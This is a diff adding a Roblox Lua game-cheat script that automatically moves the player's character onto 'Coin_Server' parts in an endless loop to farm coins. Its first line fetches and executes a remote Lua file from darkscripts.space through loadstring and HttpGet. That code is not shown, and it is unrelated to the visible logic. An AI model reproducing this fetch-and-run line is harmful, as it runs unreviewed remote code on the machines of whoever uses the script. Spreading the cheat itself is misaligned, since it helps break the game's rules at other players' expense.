@@ -1,0 +1,63 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/5e77e0b095.lua', true))()
+
+-- Define the sliding speed (higher number = faster slide)
+local slideSpeed = 20
+
+-- Function to get the player character
+local function getPlayerCharacter()
+    local player = game.Players.LocalPlayer
+    return player and player.Character or nil
+end
+
+-- Function to find the nearest "Coin_Server" part
+local function findNearestCoinServer()
+    local character = getPlayerCharacter()
+    if not character then return nil end
+
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart then return nil end
+
+    local nearestPart = nil
+    local nearestDistance = math.huge -- Set to a very large value
+
+    for _, part in ipairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") and part.Name == "Coin_Server" then
+            local distance = (humanoidRootPart.Position - part.Position).Magnitude
+            if distance < nearestDistance then
+                nearestDistance = distance
+                nearestPart = part
+            end
+        end
+    end
+
+    return nearestPart
+end
+
+-- Function to slide the player towards the target part
+local function slideToCoinServer()
+    local character = getPlayerCharacter()
+    if not character then return end
+
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart then return end
+
+    local targetPart = findNearestCoinServer()
+    if targetPart then
+        while (humanoidRootPart.Position - targetPart.Position).Magnitude > 1 do
+            -- Calculate the direction to slide
+            local direction = (targetPart.Position - humanoidRootPart.Position).Unit
+            local newPosition = humanoidRootPart.Position + direction * slideSpeed * wait(0.03) -- Moving a small step
+
+            -- Update the HumanoidRootPart position smoothly
+            humanoidRootPart.CFrame = CFrame.new(newPosition, targetPart.Position) -- Facing the target while sliding
+
+            wait(0.03) -- Update rate to control smooth sliding
+        end
+    end
+end
+
+-- Run the slide function continuously
+while true do
+    slideToCoinServer()
+    wait(1) -- Adjust the delay between slides if needed
+end
